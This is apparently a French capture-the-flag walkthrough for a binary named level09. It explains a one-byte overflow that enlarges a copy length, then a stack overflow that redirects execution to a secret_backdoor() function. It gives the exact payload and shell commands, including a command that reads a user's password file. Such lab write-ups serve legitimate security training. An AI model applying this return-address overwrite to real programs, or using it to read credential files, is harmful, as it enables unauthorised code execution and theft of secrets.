L'executable auquel nous avons acces appelle une fonction handle_msg(), qui va
mettre en stack une structure, puis passer un pointeur vers cette structure a 2
fonctions, set_username() et set_msg(). La structure comporte 2 champs suivi
d'une variable de 8 octets. Il y a egalement une fonction secret_backdoor() qui
fgets puis appelle system() sur le buffer lu.

La fonction set_username() va fgets, puis copier au plus 41 octets dans le 2eme
buffer, lui meme d'une taille de 40 octets. Il est ainsi possible d'overflow et
de modifier l'octet de poids faible de la variable de la structure.

La fonction set_msg() va aussi fgets, puis copier autant de caracteres que le
nombre contenu dans la variable de la structure. Il est ainsi possible de copier
jusqu'a 255 caracteres.

Le PIE etant active, il faut lancer gdb pour obtenir les addresses. On trouve
l'addresse de secret_backdoor(): 0x000055555555488c (et oui, on est en 64 bits)

Il n'y a pas de canary sur handle_msg(), on va donc overflow et modifier la
valeur de return. On trouve l'offset: 0xc8, on va donc ecrire 0xd0 octets.

La chaine d'attaque seras donc la suivante:
> [40 octets de pad][0xd0]\n[200 octets de pad][addresse de secret_backdoor]\ncat /home/users/end/.pass\n

	$ echo -en $(/tmp/fill 40)"\xd0\n"$(/tmp/fill 200)"\x8c\x48\x55\x55\x55\x55\x00\x00\ncat /home/users/end/.pass\n" > /tmp/in
	$ cat /tmp/in | ./level09
